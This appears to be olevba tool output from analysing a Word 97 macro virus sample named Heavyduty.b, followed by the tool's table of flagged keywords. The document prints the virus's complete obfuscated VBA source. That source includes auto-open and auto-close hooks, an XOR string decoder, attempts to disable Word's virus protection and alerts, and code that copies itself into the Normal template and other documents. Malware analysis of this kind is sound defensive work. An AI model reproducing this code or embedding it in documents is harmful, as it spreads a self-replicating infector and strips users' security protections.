olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Heavyduty.b-069c1829543cc65d2b51ace146a4f04707562441fc94dad5f9200d3e6d8dc847
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Heavyduty.b-069c1829543cc65d2b51ace146a4f04707562441fc94dad5f9200d3e6d8dc847 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisDocument1.cls 
in file: Virus.MSWord.Heavyduty.b-069c1829543cc65d2b51ace146a4f04707562441fc94dad5f9200d3e6d8dc847 - OLE stream: 'Macros/VBA/ThisDocument1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private _
Sub _
AUTOOPEN(): _
Call _
VLAM: _
End _
Sub
Private _
Sub _
AUTOCLOSE(): _
Call _
VLAM: _
End _
Sub
Private _
Sub _
AUTOEXEC(): _
Call _
VLAM: _
End _
Sub
Private _
Sub _
AUTOEXIT(): _
Call _
VLAM: _
End _
Sub
Private _
Sub _
AUTONEW(): _
Call _
VLAM: _
End _
Sub
Private _
Sub _
DOCUMENT_OPEN(): _
Call _
VLAM: _
End _
Sub
Private _
Sub _
DOCUMENT_CLOSE(): _
Call _
VLAM: _
End _
Sub
Private _
Sub _
DOCUMENT_NEW(): _
Call _
VLAM: _
End _
Sub
Private _
Function _
T(STR)
For _
I _
= _
Asc(Mid(UCase(UCase(UCase(UCase("KKKK")))), _
Int(Rnd _
* _
3) _
+ _
Fix(Fix(Fix(1))), _
Int(1))) - _
74 _
To _
Len(STR)
P _
= _
P _
& _
Chr(Asc(Mid(STR, _
I, _
Fix(Fix(Fix(1))))) _
Xor _
Int(Int(Int(Int(Int(3))))))
Next
T _
= _
P
End _
Function
Private _
Sub _
VLAM()
On _
Error _
Resume _
Next
Set _
APP _
= _
Application.Options.Application.Options.Application
Set _
OPT _
= _
Options.Application.Options.Application.Options
Set _
ST1 _
= _
APP.OPT.APP.OPT.APP.OPT.APP.OPT.APP.OPT.VirusProtection
Set _
ST2 _
= _
APP.OPT.APP.OPT.APP.OPT.APP.OPT.APP.OPT.SaveNormalPrompt
Set _
ST3 _
= _
OPT.APP.OPT.APP.OPT.APP.OPT.APP.OPT.APP.DisplayAlerts
Set _
ST4 _
= _
OPT.APP.OPT.APP.OPT.APP.OPT.APP.OPT.APP.EnableCancelKey
Set _
ST5 _
= _
OPT.APP.OPT.APP.OPT.APP.OPT.APP.OPT.APP.DisplayStatusBar
Set _
ST6 _
= _
OPT.APP.OPT.APP.OPT.APP.OPT.APP.OPT.APP.ShowVisualBasicEditor
Set _
SMA _
= _
APP.OPT.APP.OPT.APP.OPT.APP.OPT.APP.OPT.SendMailAttach
Set _
N _
= _
NormalTemplate
Set _
NV _
= _
N.VBProject
Set _
NVV _
= _
NV.VBCOMPONENTS(Asc(Mid(UCase(UCase(UCase(T("HHHH")))), _
Int(Int(Int(Int(Rnd _
* _
3)))) _
+ _
Fix(Fix(Fix(1))), _
Fix(Fix(Fix(1))))) - _
Int(Int(Int(Int(Int(74))))))
Set _
NVVC _
= _
NVV.CODEMODULE
Set _
a _
= _
ActiveDocument
Set _
AV _
= _
a.VBProject
Set _
AVV _
= _
AV.VBCOMPONENTS(Asc(Mid(UCase(UCase(UCase(T("HHHH")))), _
Int(Int(Int(Int(Rnd _
* _
3)))) _
+ _
Fix(Fix(Fix(1))), _
Fix(Fix(Fix(1))))) - _
Int(Int(Int(Int(Int(74))))))
Set _
AVVC _
= _
AVV.CODEMODULE
Set _
d _
= _
ThisDocument
Set _
DV _
= _
d.VBProject
Set _
DVV _
= _
DV.VBCOMPONENTS(Asc(Mid(UCase(UCase(UCase(T("HHHH")))), _
Int(Int(Int(Int(Rnd _
* _
3)))) _
+ _
Fix(Fix(Fix(1))), _
Fix(Fix(Fix(1))))) - _
Int(Int(Int(Int(Int(74))))))
Set _
DVVC _
= _
DVV.CODEMODULE
Set _
NORN _
= _
NVV.VBE.VBPROJECTS(Asc(Mid(UCase(UCase(UCase(T("HHHH")))), _
Int(Int(Int(Int(Rnd _
* _
3)))) _
+ _
Fix(Fix(Fix(1))), _
Fix(Fix(Fix(1))))) - _
Int(Int(Int(Int(Int(74))))))
Set _
DOCN _
= _
AVV.VBE.VBPROJECTS(Asc(Mid(UCase(UCase(UCase(T("HHHH")))), _
Int(Int(Int(Int(Rnd _
* _
3)))) _
+ _
Fix(Fix(Fix(1))), _
Fix(Fix(Fix(1))))) - _
Int(Int(Int(Int(Int(74))))))
SMA _
= _
Asc(Mid(UCase(UCase(UCase(T("HHHH")))), _
Int(Int(Int(Int(Rnd _
* _
3)))) _
+ _
Fix(Fix(Fix(1))), _
Fix(Fix(Fix(1))))) _
- Int(Int(Int(Int(Int(74)))))
MYCODE _
= _
UCase(UCase(UCase(UCase(DVVC.LINES((Asc(Mid(UCase(UCase(UCase(T("HHHH")))), _
Int(Rnd _
* _
3) _
+ _
Fix(Fix(Fix(1))), _
Fix(Fix(Fix(1))))) _
- Int(Int(Int(Int(Int(74)))))), _
400)))))
NAAM _
= _
UCase(UCase(UCase("HEAVYDUTY")))
ST1 _
= _
Asc(Mid(UCase(UCase(UCase(T("HHHH")))), _
Int(Int(Int(Int(Rnd _
* _
3)))) _
+ _
Fix(Fix(Fix(1))), _
Fix(Fix(Fix(1))))) _
- Int(Int(Int(Int(Int(75)))))
ST2 _
= _
Asc(Mid(UCase(UCase(UCase(T("HHHH")))), _
Int(Int(Int(Int(Rnd _
* _
3)))) _
+ _
Fix(Fix(Fix(1))), _
Fix(Fix(Fix(1))))) _
- Int(Int(Int(Int(Int(75)))))
ST3 _
= _
wdAlertsNone
ST4 _
= _
Asc(Mid(UCase(UCase(UCase(T("HHHH")))), _
Int(Int(Int(Int(Rnd _
* _
3)))) _
+ _
Fix(Fix(Fix(1))), _
Fix(Fix(Fix(1))))) _
- Int(Int(Int(Int(Int(75)))))
ST5 _
= _
Asc(Mid(UCase(UCase(UCase(T("HHHH")))), _
Int(Int(Int(Int(Rnd _
* _
3)))) _
+ _
Fix(Fix(Fix(1))), _
Fix(Fix(Fix(1))))) _
- Int(Int(Int(Int(Int(75)))))
ST6 _
= _
Asc(Mid(UCase(UCase(UCase(T("HHHH")))), _
Int(Int(Int(Int(Rnd _
* _
3)))) _
+ _
Fix(Fix(Fix(1))), _
Fix(Fix(Fix(1))))) _
- Int(Int(Int(Int(Int(75)))))
Select _
Case _
UCase(UCase(UCase(UCase(UCase(UCase(ThisDocument.Name))))))
Case _
UCase(UCase(UCase(UCase(UCase(UCase(UCase(T("MLQNBO-GLW"))))))))
 _
 _
 _
 _
AVVC.DELETELINES _
(Asc(Mid(UCase(UCase(UCase(T("HHHH")))), _
Int(Int(Int(Int(Rnd _
* _
3)))) _
+ Fix(Fix(Fix(1))), _
Fix(Fix(Fix(1))))) _
- _
Int(Int(Int(Int(Int(74)))))), _
AVVC.COUNTOFLINES
 _
 _
 _
 _
AVVC.ADDFROMSTRING _
UCase(MYCODE)
 _
 _
 _
 _
DOCN.Name _
= _
UCase(UCase(UCase(NAAM)))
 _
 _
 _
 _
ActiveDocument.Save
Case _
Is _
<> _
UCase(UCase(UCase(UCase(UCase(UCase(T("MLQNBO-GLW")))))))
 _
 _
 _
 _
NVVC.DELETELINES _
(Asc(Mid(UCase(UCase(UCase(T("HHHH")))), _
Int(Int(Int(Int(Rnd _
* _
3)))) _
+ Fix(Fix(Fix(1))), _
Fix(Fix(Fix(1))))) _
- _
Int(Int(Int(Int(Int(74)))))), _
NVVC.COUNTOFLINES
 _
 _
 _
 _
NVVC.ADDFROMSTRING _
UCase(MYCODE)
 _
 _
 _
 _
NORN.Name _
= _
UCase(UCase(UCase(NAAM)))
 _
 _
 _
 _
N.Save
End _
Select
If _
Day(Now()) _
= _
Int(Rnd _
* _
31) _
+ _
1 _
Then
Application.Caption _
= _
NAAM _
& _
Space(1) _
& _
ActiveDocument.Name
End _
If
'WM97.HEAVYDUTY
End _
Sub







+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |AUTOOPEN            |Runs when the Word document is opened        |
|AutoExec  |AUTOEXIT            |Runs when the Word document is closed        |
|AutoExec  |AUTOCLOSE           |Runs when the Word document is closed        |
|AutoExec  |DOCUMENT_CLOSE      |Runs when the Word document is closed        |
|AutoExec  |AUTONEW             |Runs when a new Word document is created     |
|AutoExec  |DOCUMENT_NEW        |Runs when a new Word document is created     |
|AutoExec  |DOCUMENT_OPEN       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBCOMPONENTS        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CODEMODULE          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|ADDFROMSTRING       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |NVV.VBE             |Executable file name                         |
|IOC       |AVV.VBE             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

